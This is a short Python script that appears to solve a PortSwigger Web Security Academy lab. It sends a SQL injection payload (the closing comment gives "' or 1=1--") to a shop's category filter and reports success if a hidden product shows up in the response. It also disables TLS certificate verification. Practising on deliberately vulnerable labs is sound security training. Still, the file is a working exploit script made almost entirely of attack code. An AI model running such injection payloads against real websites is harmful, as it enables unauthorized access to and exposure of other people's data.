import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def exploit_sqli(url, payload):
    uri = '/filter?category=Clothing%2c+shoes+and+accessories'
    r = requests.get(url + uri + payload, verify=False)
    if "Cat Grin" in r.text:
        return True
    else:
        return False


if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        sys.exit(-1)

    if exploit_sqli(url, payload):
        print("[+] SQL injection successful!")
    else:
        print("[-] SQL injection unsuccessful!")


# command to execute in the terminal: python3 sql-injection/test-01/test-01.py https://0abe00920479e90880b6a3330012007f.web-security-academy.net  "' or 1=1--"
# Note that the URL can be different and updates on daily basis by the PortSwigger
